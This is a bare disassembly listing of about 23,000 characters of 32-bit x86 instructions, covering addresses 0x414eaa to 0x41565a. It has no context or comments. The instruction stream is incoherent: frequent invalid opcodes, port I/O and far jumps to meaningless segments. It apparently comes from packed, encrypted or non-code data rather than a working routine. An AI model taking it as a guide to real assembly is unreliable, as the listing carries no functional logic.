  414eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eab:	jl     0x414e8a
  414ead:	jno    0x414e68
  414eaf:	cmp    al,0x56
  414eb1:	(bad)  
  414eb2:	and    BYTE PTR [ebp-0x189cca3a],cl
  414eb8:	mov    ch,0xbf
  414eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ebb:	mov    cl,0xb7
  414ebd:	out    dx,al
  414ebe:	mov    dl,0xc5
  414ec0:	fild   WORD PTR [edx]
  414ec2:	cmp    ebp,ecx
  414ec4:	push   0x7c3f063
  414ec9:	aam    0xe0
  414ecb:	and    eax,0xbcd4700
  414ed0:	mov    dl,0x18
  414ed2:	sub    DWORD PTR [edx],eax
  414ed4:	jno    0x414eae
  414ed6:	scas   al,BYTE PTR es:[edi]
  414ed7:	sbb    ch,BYTE PTR [edi]
  414ed9:	enter  0xa5f,0xc9
  414edd:	mov    al,0xd1
  414edf:	gs ss inc edx
  414ee2:	loope  0x414ee2
  414ee4:	dec    eax
  414ee5:	sub    BYTE PTR [edx+0x22b51309],dh
  414eeb:	xlat   BYTE PTR ds:[ebx]
  414eec:	xor    BYTE PTR [ecx],bl
  414eee:	push   esi
  414eef:	loope  0x414f65
  414ef1:	lods   eax,DWORD PTR ds:[esi]
  414ef2:	data16 mov cl,0xcd
  414ef5:	cdq    
  414ef6:	ins    DWORD PTR es:[edi],dx
  414ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ef8:	and    edx,DWORD PTR [ebp-0x5f]
  414efb:	fs scas eax,DWORD PTR es:[edi]
  414efd:	jmp    0x4a47:0x365cc41b
  414f04:	aas    
  414f05:	mov    eax,0xc1ba8acd
  414f0a:	retf   0x2c6d
  414f0d:	repz mov ecx,0x84e1add6
  414f13:	popf   
  414f14:	test   eax,0xa369c2c3
  414f19:	gs pushf 
  414f1b:	mov    DWORD PTR [eax+0x5e],0x3bc55648
  414f22:	pusha  
  414f23:	gs adc eax,0x66f29a66
  414f29:	cmc    
  414f2a:	ret    0x6d2
  414f2d:	xchg   edi,eax
  414f2e:	xchg   BYTE PTR [esi-0x1d],dh
  414f31:	xlat   BYTE PTR ds:[ebx]
  414f32:	or     al,0x65
  414f34:	mov    edx,0x3fe319cf
  414f39:	ins    BYTE PTR es:[edi],dx
  414f3a:	das    
  414f3b:	(bad)  
  414f3c:	xor    al,0x5c
  414f3e:	xchg   ecx,eax
  414f3f:	into   
  414f40:	xchg   edx,eax
  414f41:	jo     0x414f37
  414f43:	outs   dx,BYTE PTR ds:[esi]
  414f44:	pop    ecx
  414f45:	outs   dx,BYTE PTR ds:[esi]
  414f46:	jp     0x414f66
  414f48:	xor    bl,BYTE PTR [edx]
  414f4a:	mov    ds:0xadb51d77,al
  414f4f:	cmp    cl,BYTE PTR [ebx+0x7b]
  414f52:	sar    ch,cl
  414f54:	sbb    BYTE PTR [edi+0x6e],0x45
  414f58:	out    dx,al
  414f59:	mov    ah,0x76
  414f5b:	repz (bad) 
  414f5d:	cmp    al,0xe6
  414f5f:	mov    ch,0xd8
  414f61:	jg     0x414fd2
  414f63:	retf   0x4f1a
  414f66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f67:	inc    ebp
  414f68:	aam    0x7b
  414f6a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f6c:	mov    edi,0xfef3bb39
  414f71:	fbld   TBYTE PTR [edx]
  414f73:	pop    eax
  414f74:	faddp  st(1),st
  414f76:	scas   eax,DWORD PTR es:[edi]
  414f77:	sbb    BYTE PTR [ebx],ch
  414f79:	inc    edi
  414f7a:	mov    es,WORD PTR [edx-0x32]
  414f7d:	and    ah,BYTE PTR [edi]
  414f7f:	imul   edi,eax,0x6cf5726e
  414f85:	popa   
  414f86:	mov    esi,0x59eb3bc7
  414f8b:	fist   WORD PTR [ebx]
  414f8d:	xlat   BYTE PTR ds:[ebx]
  414f8e:	sub    DWORD PTR [esi-0x1040b32a],0xee6d74a7
  414f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f99:	in     al,0x46
  414f9b:	jge    0x41500b
  414f9d:	icebp  
  414f9e:	pop    ebp
  414f9f:	jmp    0x414f7d
  414fa1:	inc    esp
  414fa2:	mov    bl,BYTE PTR [esi-0x33]
  414fa5:	call   0x650f5cd3
  414faa:	or     al,0x3d
  414fac:	mov    edi,0xe9f109bf
  414fb1:	inc    ecx
  414fb2:	inc    ecx
  414fb3:	ins    BYTE PTR es:[edi],dx
  414fb4:	loopne 0x414fe5
  414fb6:	in     al,dx
  414fb7:	mov    edx,0x22087c8d
  414fbc:	jecxz  0x414f7c
  414fbe:	and    eax,DWORD PTR [ecx]
  414fc0:	repz ret 
  414fc2:	fcmovnb st,st(3)
  414fc4:	or     esi,edi
  414fc6:	mov    eax,0x2d0b6f2e
  414fcb:	xor    ebp,ecx
  414fcd:	adc    DWORD PTR [ebx],edx
  414fcf:	lods   al,BYTE PTR ds:[esi]
  414fd0:	xor    DWORD PTR [ecx],esp
  414fd2:	jmp    0xe2bf793b
  414fd7:	add    BYTE PTR [edi],cl
  414fd9:	(bad)  
  414fda:	xchg   esi,eax
  414fdb:	leave  
  414fdc:	add    DWORD PTR ds:0xcdc26c13,edx
  414fe2:	pusha  
  414fe3:	setno  BYTE PTR [ebp+0x76aee3d3]
  414fea:	inc    ebp
  414feb:	in     eax,dx
  414fec:	repz (bad) 
  414fee:	out    dx,al
  414fef:	cdq    
  414ff0:	push   ebp
  414ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff3:	retf   
  414ff4:	sub    esp,DWORD PTR [ebp+0x2bab9090]
  414ffa:	adc    edx,DWORD PTR [edx+0x31]
  414ffd:	retf   0x8831
  415000:	cwde   
  415001:	scas   al,BYTE PTR es:[edi]
  415002:	adc    bl,ch
  415004:	mov    ds,WORD PTR ds:0x801199f9
  41500a:	or     DWORD PTR [eax+0x72],ecx
  41500d:	repz fcomp QWORD PTR [ecx+0x616cfb98]
  415014:	(bad)  
  415015:	and    al,0xe9
  415017:	test   dh,0xf
  41501a:	push   0x12f99eab
  41501f:	je     0x415024
  415021:	jne    0x41509c
  415023:	cwde   
  415024:	sar    DWORD PTR [edi+ebx*4-0x7e23bfd5],0xc
  41502c:	adc    eax,DWORD PTR [edx+0x36]
  41502f:	inc    ebp
  415030:	mov    ebx,DWORD PTR [edi]
  415032:	and    dh,ah
  415034:	adc    esp,esi
  415036:	dec    edx
  415037:	xor    BYTE PTR [esi+ecx*4],cl
  41503a:	sbb    al,0x40
  41503c:	(bad)  
  41503d:	xlat   BYTE PTR ds:[ebx]
  41503e:	js     0x41504e
  415040:	ds cwde 
  415042:	ja     0x4150b5
  415044:	(bad)  
  415045:	xchg   ebp,eax
  415046:	push   0xffffffba
  415048:	mov    eax,0xf437ed88
  41504d:	jl     0x4150cc
  41504f:	sbb    DWORD PTR [ecx+0x5323e61d],ebx
  415055:	xchg   ecx,eax
  415056:	bound  ecx,QWORD PTR [edi]
  415058:	or     eax,0x6dcb91d2
  41505d:	inc    eax
  41505e:	jo     0x41501e
  415060:	imul   esi,DWORD PTR [esp+eiz*8],0x47a81dfd
  415067:	adc    al,0xbb
  415069:	aaa    
  41506a:	lods   al,BYTE PTR ds:[esi]
  41506b:	cli    
  41506c:	sbb    ecx,edx
  41506e:	inc    ecx
  41506f:	loopne 0x41509d
  415071:	push   edx
  415072:	xchg   esi,eax
  415073:	test   DWORD PTR [eax+edi*2+0x7b],esp
  415077:	dec    eax
  415078:	mov    edi,0x292c2563
  41507d:	dec    ecx
  41507e:	mov    cl,0x40
  415080:	push   ss
  415081:	or     eax,DWORD PTR [ebp-0x26809362]
  415087:	test   eax,0xf93be75f
  41508c:	xor    DWORD PTR [eax-0x3b131ff],eax
  415092:	fisub  WORD PTR [eax+0x33]
  415095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415096:	into   
  415097:	xchg   ebp,eax
  415098:	bsr    esp,DWORD PTR [edi-0x12b11059]
  41509f:	xor    dh,BYTE PTR [esi-0x7a]
  4150a2:	repz dec edi
  4150a4:	mov    edi,0xf211566e
  4150a9:	or     BYTE PTR [ecx],cl
  4150ab:	ret    
  4150ac:	clc    
  4150ad:	loopne 0x4150aa
  4150af:	inc    BYTE PTR [ebx]
  4150b1:	add    DWORD PTR [esi-0x5a1895d6],ebx
  4150b7:	adc    BYTE PTR [eax],dl
  4150b9:	aad    0xe7
  4150bb:	lods   eax,DWORD PTR ds:[esi]
  4150bc:	and    edi,DWORD PTR [ebp+0x47ef9eb3]
  4150c2:	cmp    al,0x89
  4150c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150c5:	ins    DWORD PTR es:[edi],dx
  4150c6:	aas    
  4150c7:	retf   0x7a69
  4150ca:	arpl   WORD PTR [ecx+0x451de517],sp
  4150d0:	sar    bl,0xda
  4150d3:	cmp    DWORD PTR [esp+edi*1],0xffffffb3
  4150d7:	repnz push es
  4150d9:	imul   esp,DWORD PTR [ecx+0x33],0x5d
  4150dd:	xchg   ebx,eax
  4150de:	xchg   ecx,eax
  4150df:	ret    0x89e8
  4150e2:	repz jp 0x415078
  4150e5:	or     ecx,DWORD PTR [ebp-0x5c]
  4150e8:	ins    BYTE PTR es:[edi],dx
  4150e9:	clc    
  4150ea:	(bad)  
  4150eb:	in     al,0xc9
  4150ed:	scas   al,BYTE PTR es:[edi]
  4150ee:	test   DWORD PTR [ebx],eax
  4150f0:	jge    0x415159
  4150f2:	mov    WORD PTR [eax+0x77],gs
  4150f5:	sub    DWORD PTR [ebx+ebx*4-0x63],eax
  4150f9:	arpl   WORD PTR [ebx],di
  4150fb:	push   cs
  4150fc:	ss cli 
  4150fe:	nop
  4150ff:	out    dx,eax
  415100:	test   BYTE PTR [esi+0x799a571c],ch
  415106:	add    DWORD PTR [edx],0xadc69db2
  41510c:	out    0xe5,al
  41510e:	add    DWORD PTR [ebx-0x6c],0xe5ae0b22
  415115:	xchg   esi,eax
  415116:	jmp    0x415187
  415118:	hlt    
  415119:	in     al,dx
  41511a:	sbb    eax,0x54db191b
  41511f:	or     esi,esp
  415121:	in     al,dx
  415122:	pop    ecx
  415123:	mov    al,ds:0x325429a4
  415128:	adc    al,0xce
  41512a:	sub    ebx,DWORD PTR [ebx+esi*4+0x5d]
  41512e:	leave  
  41512f:	cmp    al,0xae
  415131:	imul   esi,DWORD PTR [ecx],0x75
  415134:	lds    esp,FWORD PTR [edx]
  415136:	hlt    
  415137:	scas   al,BYTE PTR es:[edi]
  415138:	push   0xd72947a0
  41513d:	sub    bl,0xca
  415140:	into   
  415141:	pop    esi
  415142:	scas   eax,DWORD PTR es:[edi]
  415143:	pop    edi
  415144:	jge    0x4151a7
  415146:	xor    ch,bl
  415148:	jecxz  0x415167
  41514a:	xchg   ecx,eax
  41514b:	stos   DWORD PTR es:[edi],eax
  41514c:	repz je 0x4150e1
  41514f:	cmp    BYTE PTR [edi+0x655ef4b7],ch
  415155:	dec    edi
  415156:	pop    ebp
  415157:	push   0x48931ed9
  41515c:	stos   BYTE PTR es:[edi],al
  41515d:	xchg   ebp,eax
  41515e:	jle    0x4151d4
  415160:	and    dh,al
  415162:	inc    esp
  415163:	add    edx,DWORD PTR [edi]
  415165:	mov    ebx,0xb148fee5
  41516a:	(bad)  
  41516b:	jne    0x4151e9
  41516d:	fcom   QWORD PTR gs:[ecx]
  415170:	(bad)  
  415171:	js     0x41513a
  415173:	cmp    esp,DWORD PTR [eax+0x19da17fc]
  415179:	jg     0x41517c
  41517b:	test   BYTE PTR [ebx+0x1],ah
  41517e:	dec    ebx
  41517f:	pushf  
  415180:	cwde   
  415181:	xor    edi,esp
  415183:	out    dx,eax
  415184:	inc    esi
  415185:	in     al,0xcd
  415187:	mov    eax,0x22806c05
  41518c:	sub    eax,0x18a48a4b
  415191:	jl     0x41518f
  415193:	outs   dx,DWORD PTR ds:[esi]
  415194:	das    
  415195:	push   ebp
  415196:	dec    ebp
  415197:	sub    eax,0xf7604b47
  41519c:	xor    BYTE PTR [ecx-0x2f77c7c9],al
  4151a2:	ret    0xe0ef
  4151a5:	js     0x41512b
  4151a7:	test   DWORD PTR [ecx+0x3350a589],edx
  4151ad:	cli    
  4151ae:	test   BYTE PTR [edi-0x548cabf1],bl
  4151b4:	dec    edi
  4151b5:	jge    0x415194
  4151b7:	lods   al,BYTE PTR ds:[esi]
  4151b8:	pop    ebx
  4151b9:	mov    cl,ah
  4151bb:	and    eax,0x852ecc6
  4151c0:	dec    edi
  4151c1:	pop    esp
  4151c2:	xor    ah,bh
  4151c4:	sub    esp,DWORD PTR [ecx+0xabcde72]
  4151ca:	test   DWORD PTR [esp+ebx*4+0x6d],esi
  4151ce:	fld    TBYTE PTR [esi+edx*8+0x528d5473]
  4151d5:	int3   
  4151d6:	daa    
  4151d7:	jnp    0x4151c3
  4151d9:	mov    al,0xbc
  4151db:	cdq    
  4151dc:	ds iret 
  4151de:	adc    esp,DWORD PTR [esi]
  4151e0:	mov    edi,0xb7a4bf70
  4151e5:	mov    BYTE PTR [esp+edi*2],bl
  4151e8:	loopne 0x4151f0
  4151ea:	outs   dx,BYTE PTR ds:[esi]
  4151eb:	jmp    0xd257:0x85dbd570
  4151f2:	mov    DWORD PTR [ecx-0x4b],eax
  4151f5:	imul   ebx,DWORD PTR [esi+0x1],0x9479dfe4
  4151fc:	jnp    0x415192
  4151fe:	xor    eax,0xf7e6159f
  415203:	sub    bl,BYTE PTR [ecx-0x34da38bc]
  415209:	cdq    
  41520a:	sbb    al,0xfc
  41520c:	imul   esp,DWORD PTR [ecx],0x6a
  41520f:	push   eax
  415210:	retf   0xb1dd
  415213:	(bad)  
  415216:	add    DWORD PTR ds:[esi-0x3f54d05],ebx
  41521d:	jne    0x4151ee
  41521f:	push   ebp
  415220:	into   
  415221:	outs   dx,DWORD PTR ds:[esi]
  415222:	arpl   cx,ax
  415224:	xchg   ebp,eax
  415225:	pusha  
  415226:	loope  0x41528b
  415228:	mov    ecx,ebp
  41522a:	xchg   ebp,eax
  41522b:	sub    eax,DWORD PTR [eax-0x71ae9302]
  415231:	and    BYTE PTR [ebx-0x584b4844],cl
  415237:	mov    bh,0xa9
  415239:	fcom   st(5)
  41523b:	jmp    0xfaee959c
  415240:	int3   
  415241:	push   ds
  415242:	dec    ecx
  415243:	scas   eax,DWORD PTR es:[edi]
  415244:	xchg   BYTE PTR [edx],cl
  415246:	mov    al,0x30
  415248:	adc    esp,DWORD PTR [esi]
  41524a:	sbb    ecx,0xfffffff1
  41524d:	fsub   DWORD PTR [ebx+0x44]
  415250:	mov    esi,edi
  415252:	xlat   BYTE PTR ds:[ebx]
  415253:	pushf  
  415254:	add    BYTE PTR [ebx-0x2706897d],dh
  41525a:	mov    bh,0x79
  41525c:	xor    esi,DWORD PTR [ebx-0x7fddaa03]
  415262:	and    DWORD PTR [ecx+0x3b],esp
  415265:	dec    ebx
  415266:	jmp    0xdd8bf832
  41526b:	test   eax,0x5ef3e173
  415270:	pop    es
  415271:	mov    edi,0x959cf9f
  415276:	gs sub edx,ebx
  415279:	xor    DWORD PTR [edi],edx
  41527b:	xchg   ebx,eax
  41527c:	adc    al,BYTE PTR [edx-0x58]
  41527f:	dec    esi
  415280:	icebp  
  415281:	jle    0x4152da
  415283:	xlat   BYTE PTR ds:[ebx]
  415284:	rcr    edi,0xf6
  415287:	out    0x66,al
  415289:	adc    dh,BYTE PTR [edi+0x174bb46e]
  41528f:	add    DWORD PTR [eax+eax*4],0x466f67b3
  415296:	xor    BYTE PTR [edi+0x209cabab],0xcf
  41529d:	mov    ah,0x86
  41529f:	repnz mov ecx,0x2763243
  4152a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152a6:	pop    ds
  4152a7:	ins    BYTE PTR es:[edi],dx
  4152a8:	adc    ebp,ebx
  4152aa:	pop    ds
  4152ab:	jge    0x41530f
  4152ad:	pop    ds
  4152ae:	sti    
  4152af:	pop    eax
  4152b0:	mov    ecx,0x79223652
  4152b5:	inc    ebp
  4152b6:	ins    BYTE PTR es:[edi],dx
  4152b7:	iret   
  4152b8:	jmp    0x736:0x4b587009
  4152bf:	test   ah,bh
  4152c1:	jb     0x41528d
  4152c3:	or     BYTE PTR [ebx-0x25107b3a],ah
  4152c9:	pop    edi
  4152ca:	dec    esp
  4152cb:	push   cs
  4152cc:	gs scas eax,DWORD PTR es:[edi]
  4152ce:	jno    0x4152ac
  4152d0:	jne    0x415273
  4152d2:	pop    edi
  4152d3:	xor    DWORD PTR [eax+0x29],edi
  4152d6:	inc    edi
  4152d7:	cmp    edx,DWORD PTR ds:0xac938173
  4152dd:	loope  0x41534f
  4152df:	int3   
  4152e0:	dec    edx
  4152e1:	and    eax,0x57a0c3b8
  4152e6:	sbb    DWORD PTR [ebx],edi
  4152e8:	pop    ds
  4152e9:	test   al,0xe1
  4152eb:	pop    esp
  4152ec:	gs call 0xcfaf:0xadb351cd
  4152f4:	xchg   DWORD PTR [esp+ebp*1+0x4e],ecx
  4152f8:	fwait
  4152f9:	mov    bl,0x16
  4152fb:	lods   al,BYTE PTR ds:[esi]
  4152fc:	mov    al,ds:0xd60835d7
  415301:	or     esi,edi
  415303:	cmp    ecx,DWORD PTR [ebp+0x68]
  415306:	ror    DWORD PTR [ebp+0x2b6825a2],1
  41530c:	add    dh,BYTE PTR [edx+ebx*8]
  41530f:	icebp  
  415310:	(bad)  
  415311:	fst    QWORD PTR [edi-0x1f]
  415314:	repz adc DWORD PTR [esi-0x747b722f],edi
  41531b:	adc    eax,0x6e413afc
  415320:	adc    ch,0x48
  415323:	pop    ss
  415324:	sar    DWORD PTR [eax*8+0x1c7ed445],0x96
  41532c:	mov    bh,al
  41532e:	add    DWORD PTR [esi+0x2e],esi
  415331:	imul   ebx,DWORD PTR [ebx+0x76662eb4],0x568b8494
  41533b:	pop    esp
  41533c:	jp     0x4152c3
  41533e:	loopne 0x415376
  415340:	fcom   QWORD PTR [edx-0x47e4e562]
  415346:	loopne 0x415399
  415348:	call   DWORD PTR [edi-0x1a7dceef]
  41534e:	push   ebp
  41534f:	or     DWORD PTR [edi+ebx*2+0x61],ebp
  415353:	mov    DWORD PTR [ebx],ebp
  415355:	les    esp,FWORD PTR [esi]
  415357:	cld    
  415358:	stos   BYTE PTR es:[edi],al
  415359:	gs (bad) 
  41535b:	in     eax,0xd7
  41535d:	fcmovbe st,st(3)
  41535f:	je     0x4152e2
  415361:	jb     0x4153c0
  415363:	push   eax
  415364:	push   ebx
  415365:	lods   eax,DWORD PTR ds:[esi]
  415366:	dec    esi
  415367:	aas    
  415368:	pop    ebx
  415369:	(bad)  
  41536a:	pop    ebx
  41536b:	sbb    eax,DWORD PTR [edi+edi*8-0x3c]
  41536f:	cmp    DWORD PTR [edi+0x3],esp
  415372:	lds    ebp,FWORD PTR [edi+0x7e736da6]
  415378:	mov    BYTE PTR [ecx+0x5b],bl
  41537b:	das    
  41537c:	and    bl,BYTE PTR [ebx+eax*1]
  41537f:	test   ebp,0xa00e6969
  415385:	adc    eax,0xc898fe60
  41538a:	or     cl,al
  41538c:	mov    edi,DWORD PTR [edx-0x1b0c79b0]
  415392:	xchg   edx,eax
  415393:	rol    DWORD PTR [ecx+eiz*1+0x24],0x9
  415398:	xchg   DWORD PTR [edx-0x16141f8c],ebp
  41539e:	test   DWORD PTR [ebx-0x9],edx
  4153a1:	ficomp DWORD PTR [eax]
  4153a3:	inc    esi
  4153a4:	idiv   DWORD PTR cs:[ecx-0x4fc006e3]
  4153ab:	or     esi,eax
  4153ad:	add    cl,bh
  4153af:	cmp    esp,ecx
  4153b1:	(bad)  
  4153b2:	scas   eax,DWORD PTR es:[edi]
  4153b3:	sub    al,0xe8
  4153b5:	loop   0x415361
  4153b7:	jnp    0x41542b
  4153b9:	popa   
  4153ba:	dec    edi
  4153bb:	xchg   ecx,eax
  4153bc:	mov    bl,0x53
  4153be:	or     cl,BYTE PTR [esi+0x331e9db2]
  4153c4:	xor    al,0xdd
  4153c6:	pop    esp
  4153c7:	test   eax,0xe44d5f0f
  4153cc:	int3   
  4153cd:	dec    esp
  4153ce:	clc    
  4153cf:	add    dl,BYTE PTR [edx-0x7dc94162]
  4153d5:	jnp    0x415439
  4153d7:	aaa    
  4153d8:	jle    0xf6e65e9c
  4153de:	(bad)  
  4153df:	shr    DWORD PTR [edx-0x29],0x5
  4153e3:	test   BYTE PTR fs:[edx],dh
  4153e6:	and    DWORD PTR [esi+eax*2-0x79],ecx
  4153ea:	push   cs
  4153eb:	out    0x34,eax
  4153ed:	mov    dl,BYTE PTR ds:0x474809e1
  4153f3:	ss jmp 0xbcee:0xef4f8b61
  4153fb:	sbb    DWORD PTR [edi+0x64],ebx
  4153fe:	mov    al,ds:0x77103c7b
  415403:	rcr    edi,cl
  415405:	fisttp WORD PTR [ebp+0xf]
  415408:	aas    
  415409:	and    al,0x4a
  41540b:	xlat   BYTE PTR ds:[ebx]
  41540c:	lods   al,BYTE PTR gs:[esi]
  41540e:	jecxz  0x4153b4
  415410:	push   eax
  415411:	js     0x4153b7
  415413:	inc    ecx
  415414:	xlat   BYTE PTR ds:[ebx]
  415415:	loope  0x4153b7
  415417:	sbb    DWORD PTR [edx],eax
  415419:	jnp    0x41539f
  41541b:	loopne 0x41546d
  41541d:	cmp    ecx,DWORD PTR [esi-0x4c]
  415420:	stos   DWORD PTR es:[edi],eax
  415421:	stos   DWORD PTR es:[edi],eax
  415422:	jns    0x41541b
  415424:	in     eax,dx
  415425:	aaa    
  415426:	sbb    dh,BYTE PTR [ecx]
  415428:	mov    cl,0xa
  41542a:	leave  
  41542b:	dec    edi
  41542c:	mov    al,0xb6
  41542e:	mov    ds:0xa831a05a,eax
  415433:	std    
  415434:	add    eax,0xb942255a
  415439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41543a:	pop    ds
  41543b:	inc    ebx
  41543c:	sub    ch,ch
  41543e:	fadd   DWORD PTR [esi-0x182e0df5]
  415444:	pop    ds
  415445:	neg    DWORD PTR [esi]
  415447:	call   0x6138d5e2
  41544c:	shr    BYTE PTR [edx+0x36],0xc8
  415450:	pushf  
  415451:	jbe    0x415498
  415453:	and    eax,0x423f2b58
  415458:	jno    0x4154d7
  41545a:	in     al,0xbe
  41545c:	dec    ebp
  41545d:	mov    ebx,DWORD PTR [ecx-0x6]
  415460:	or     eax,0x9dbb8b50
  415465:	mov    al,0x19
  415467:	aas    
  415468:	push   cs
  415469:	mov    edx,0x5afa0e2
  41546e:	or     DWORD PTR [ebp+0x3f9461b4],ebp
  415474:	test   eax,0x40f7c6ae
  415479:	cmp    eax,0xed1c4dd3
  41547e:	es xchg edx,eax
  415480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415481:	dec    esi
  415482:	adc    ah,0x9f
  415485:	cmp    BYTE PTR [ebp-0x3f27f8da],bh
  41548b:	dec    edi
  41548c:	xor    eax,0x1e3c7e45
  415491:	fs xchg esp,eax
  415493:	scas   al,BYTE PTR es:[edi]
  415494:	rcl    BYTE PTR [ecx],cl
  415496:	jnp    0x415487
  415498:	mov    ds:0xd1bddca3,al
  41549d:	xor    bl,BYTE PTR ds:0x3d7ea450
  4154a3:	jmp    0xe020:0x85e72316
  4154aa:	push   ss
  4154ab:	mov    edx,0xdd5854e2
  4154b0:	sbb    ecx,DWORD PTR [eax]
  4154b2:	sbb    dh,BYTE PTR [ebp-0x752527f2]
  4154b8:	stc    
  4154b9:	shl    BYTE PTR [eax+0x427d4563],0xa1
  4154c0:	pop    ss
  4154c1:	mov    dh,0x2a
  4154c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154c4:	push   0x14517948
  4154c9:	ret    0x7c0f
  4154cc:	in     eax,dx
  4154cd:	dec    eax
  4154ce:	fs inc edi
  4154d0:	dec    esi
  4154d1:	sbb    edx,0xffffffa1
  4154d4:	mov    bh,0x26
  4154d6:	xlat   BYTE PTR ds:[ebx]
  4154d7:	xchg   ebp,eax
  4154d8:	arpl   WORD PTR [eax+0x4f0090de],di
  4154de:	(bad)  
  4154df:	call   0xa33e1cd6
  4154e4:	iret   
  4154e5:	dec    ebx
  4154e6:	adc    esi,DWORD PTR gs:[ebx-0x48e4994]
  4154ed:	and    BYTE PTR [edx+ecx*4+0x1d],cl
  4154f1:	fucomi st,st(3)
  4154f3:	nop
  4154f4:	inc    edx
  4154f5:	mov    BYTE PTR [edi+ebp*4+0x136a5f53],ch
  4154fc:	pop    ebp
  4154fd:	sub    DWORD PTR [edi],0x893b9ef4
  415503:	pop    ds
  415504:	mov    esp,0x2cbbd8c6
  415509:	xchg   esi,eax
  41550a:	fnsave [edi]
  41550c:	sub    bh,ch
  41550e:	ret    
  41550f:	pop    esi
  415510:	sub    DWORD PTR [esi+eiz*8],ecx
  415513:	cmp    DWORD PTR [esp+ecx*2],edx
  415516:	inc    esi
  415517:	mov    al,0xdb
  415519:	xchg   ecx,eax
  41551a:	cmp    eax,0xf82731d8
  41551f:	mov    dh,0xa3
  415521:	push   cs
  415522:	sub    DWORD PTR [esi-0x7b],ebx
  415525:	lods   eax,DWORD PTR ds:[esi]
  415526:	out    dx,al
  415527:	rcl    DWORD PTR [edi+0x31],0x96
  41552b:	jg     0x4154cc
  41552d:	sbb    bl,ah
  41552f:	lods   al,BYTE PTR ds:[esi]
  415530:	or     eax,0x2de33fa1
  415535:	je     0x4154dd
  415537:	test   al,0x19
  415539:	shl    DWORD PTR ds:0xfb13146a,1
  41553f:	inc    eax
  415540:	push   ebp
  415541:	ror    BYTE PTR [edx],0x9b
  415544:	test   al,0x74
  415546:	xchg   ebp,eax
  415547:	cmp    eax,0xb6fb46ce
  41554c:	pop    esi
  41554d:	mov    ch,0x4
  41554f:	sbb    bl,BYTE PTR [eax-0x1c2cc643]
  415555:	inc    ecx
  415556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415557:	in     eax,dx
  415558:	fldlg2 
  41555a:	sub    eax,0xbd0a8fd
  41555f:	std    
  415560:	adc    eax,0xb51f5abd
  415565:	outs   dx,BYTE PTR ds:[esi]
  415566:	push   edx
  415567:	loopne 0x415542
  415569:	sbb    eax,0x536803a4
  41556e:	(bad)  
  41556f:	in     eax,dx
  415570:	jbe    0x415503
  415572:	mov    ah,0x17
  415574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415575:	into   
  415576:	mov    cl,BYTE PTR [ebp+0x4d05707a]
  41557c:	aas    
  41557d:	fst    DWORD PTR [ebp+0x542e8d7a]
  415583:	fsub   DWORD PTR [ebx+0x2e52b2a1]
  415589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41558a:	into   
  41558b:	xor    DWORD PTR [edx+0x34f54f9e],eax
  415591:	scas   eax,DWORD PTR es:[edi]
  415592:	ret    
  415593:	push   DWORD PTR [edi+0x41]
  415596:	retf   
  415597:	std    
  415598:	loop   0x41560c
  41559a:	add    eax,0x1e1ea8ec
  41559f:	and    edx,DWORD PTR [ebp-0x31cbc3b8]
  4155a5:	jg     0x41559e
  4155a7:	and    esi,ebx
  4155a9:	xlat   BYTE PTR ds:[ebx]
  4155aa:	mov    ebx,0x63e72ce0
  4155af:	xor    eax,0x51045795
  4155b4:	jne    0x415562
  4155b6:	mov    bh,0x86
  4155b8:	xchg   ebx,eax
  4155b9:	shr    edx,0x7d
  4155bc:	daa    
  4155bd:	push   es
  4155be:	xor    esp,eax
  4155c0:	cwde   
  4155c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c2:	adc    ah,BYTE PTR [ebx]
  4155c4:	pop    di
  4155c6:	mov    al,BYTE PTR cs:0x383560f5
  4155cd:	and    eax,0x1ddd8aeb
  4155d2:	fisttp QWORD PTR [ecx-0x10]
  4155d5:	mov    ds:0x58554ba9,al
  4155da:	mov    cl,0xc2
  4155dc:	and    ebp,DWORD PTR [ecx+0x5c]
  4155df:	mov    ah,BYTE PTR [eax]
  4155e1:	dec    esi
  4155e2:	add    DWORD PTR [ecx],esp
  4155e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155e5:	enter  0xe4c6,0x1d
  4155e9:	dec    esp
  4155ea:	sahf   
  4155eb:	lahf   
  4155ec:	jge    0x41559d
  4155ee:	(bad)  
  4155ef:	or     eax,0x6beb067f
  4155f4:	repz mov esi,0x4502509b
  4155fa:	mov    esp,0x2691bc5e
  4155ff:	add    eax,0x8736a531
  415604:	(bad)  
  415606:	cmp    al,0xc5
  415608:	pusha  
  415609:	imul   esi,DWORD PTR [edx+edx*4],0xebacc4f3
  415610:	pop    eax
  415611:	inc    ebx
  415612:	jp     0x415614
  415614:	pop    ebp
  415615:	shl    DWORD PTR [edi-0x59cb5022],cl
  41561b:	xor    BYTE PTR [esi-0x6e],ah
  41561e:	add    cl,BYTE PTR ds:0x3585152
  415624:	and    edi,DWORD PTR [edi+0x2]
  415627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415628:	push   ebx
  415629:	adc    DWORD PTR [eax-0x608cefc0],edi
  41562f:	retf   0x3acd
  415632:	or     dh,cl
  415634:	jo     0x41564a
  415636:	xor    eax,DWORD PTR [edi-0x561ad2d4]
  41563c:	test   DWORD PTR [bp-0x2e],edi
  415640:	or     BYTE PTR [esi],dh
  415642:	jns    0x41563b
  415644:	ret    0x6016
  415647:	jae    0x41569c
  415649:	sbb    BYTE PTR [ecx+0x5c],ch
  41564c:	cmp    eax,0xfbe666fc
  415651:	fiadd  WORD PTR [edi-0x19ec6b4d]
  415657:	push   edi
  415658:	in     eax,0xf6
  41565a:	inc    edi
